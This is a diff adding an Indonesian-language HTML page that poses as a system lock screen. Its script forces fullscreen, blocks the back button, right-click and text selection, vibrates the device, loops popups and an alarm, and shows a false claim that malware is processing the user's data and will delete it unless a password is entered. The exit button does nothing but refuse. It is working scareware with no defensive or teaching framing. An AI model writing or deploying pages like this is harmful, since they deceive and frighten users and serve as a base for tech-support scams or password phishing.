@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>⚠️ Sistem Dikunci</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      font-family: 'Courier New', monospace;
+    }
+    body {
+      background-color: black;
+      color: red;
+      text-align: center;
+      padding: 20px;
+    }
+    .warning {
+      font-size: 24px;
+      margin-top: 20px;
+      animation: blink 1s infinite;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+    input {
+      margin-top: 20px;
+      padding: 10px;
+      width: 80%;
+      font-size: 18px;
+      border: none;
+      background: #300;
+      color: #fff;
+      outline: none;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background: darkred;
+      color: white;
+      border: none;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    #desc {
+      margin-top: 20px;
+      font-size: 16px;
+      color: #f55;
+    }
+  </style>
+</head>
+<body onload="startEffects()">
+  <h1 class="warning">⚠️ SISTEM ANDA TERKUNCI ⚠️</h1>
+  <div id="desc"></div>
+  <input type="password" placeholder="Masukkan sandi untuk membuka" />
+  <br />
+  <button onclick="fakeExit()">Keluar</button>
+
+  <audio id="alarm" loop>
+    <source src="https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3" type="audio/mpeg">
+  </audio>
+
+  <script>
+    function startEffects() {
+      // Paksa Fullscreen
+      if (document.documentElement.requestFullscreen) {
+        document.documentElement.requestFullscreen();
+      }
+
+      // Blok tombol back
+      history.pushState(null, "", location.href);
+      window.onpopstate = function () {
+        history.go(1);
+      };
+
+      // Blok klik kanan dan seleksi teks
+      document.addEventListener('contextmenu', e => e.preventDefault());
+      document.addEventListener('selectstart', e => e.preventDefault());
+
+      // Vibrasi berulang
+      setInterval(() => {
+        navigator.vibrate([1000, 500, 1000]);
+      }, 4000);
+
+      // Pop-up looping
+      setInterval(() => {
+        confirm("⚠️ Peringatan: Sistem Anda dikunci! Masukkan sandi!");
+      }, 15000);
+
+      // Deskripsi ketik otomatis
+      const teks = "Data perangkat Anda sedang diproses. Deteksi pelanggaran sistem oleh malware aktif. Untuk mencegah penghapusan data dan akses total oleh sistem remote, masukkan sandi Anda sekarang!";
+      let i = 0;
+      const ketik = setInterval(() => {
+        if (i < teks.length) {
+          document.getElementById("desc").innerHTML += teks[i];
+          i++;
+        } else {
+          clearInterval(ketik);
+        }
+      }, 40);
+
+      // Alarm bunyi
+      document.getElementById("alarm").play().catch(() => {});
+    }
+
+    function fakeExit() {
+      alert("❌ Gagal keluar: Sandi belum dimasukkan.");
+    }
+  </script>
+</body>
+</html>
